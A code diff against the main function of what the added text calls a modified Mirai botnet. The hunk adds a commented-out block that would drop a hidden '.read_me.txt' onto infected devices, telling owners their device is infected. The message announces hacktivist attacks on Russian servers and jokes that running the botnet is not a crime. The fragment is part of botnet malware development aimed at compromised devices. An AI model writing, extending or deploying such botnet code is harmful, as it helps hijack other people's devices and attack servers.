@@ -53,6 +53,26 @@ int main(int argc, char **args)
     int tbl_exec_succ_len;
     int pgid, pings = 0;
 
+/* Message
+    FILE *fp;
+    fp = oepn(".read_me.txt", "w+");
+    fprintf(fp, "You are lucky to have found this. (?)\n\n");
+    fprintf(fp, "My name is 255, I am a programmer who modified the Mirai Botnet created by ");
+    fprintf(fp, "Anna-senpai and created a new \"Mirai BotNet to Tashiro\" (ja: 未来砲).\n\n");
+    fprintf(fp, "As long as President Putin does not stop the war, we programmers will ");
+    fprintf(fp, "continue to attack Russian servers. You too need to take some action to ");
+    fprintf(fp, "stop this war. If you want to get back to a normal life, send out messages ");
+    fprintf(fp, "against the war on social networking sites. Much easier than being held for ransom, isn't it?\n\n\n");
+    fprintf(fp, "Q&A\n");
+    fprintf(fp, "Q: Is this device infected with \"Mirai BotNet to Tashiro\" (ja: 未来砲)?\n");
+    fprintf(fp, "A:Yes. It is infected. However, please be assured that no personal information will be extracted.\n");
+    fprintf(fp, "Q:255, I am committing a crime, right?\n");
+    fprintf(fp, "A:I can't say. I may be running a program called \"Mirai BotNet to Tahiro\" (ja: 未来砲), or someone ");
+    fprintf(fp, "else may be running it. Therefore, it is not a crime because I do not know that I am committing a crime! LOL\n\n\n\n");
+    fprintf(fp, "This is a translation from Japanese to English from DeepL, so the text may be wrong. Please give them a warm welcome.\n");
+    fclose(fp);
+*/
+
 //#ifndef DEBUG
     sigset_t sigs;
     int wfd;
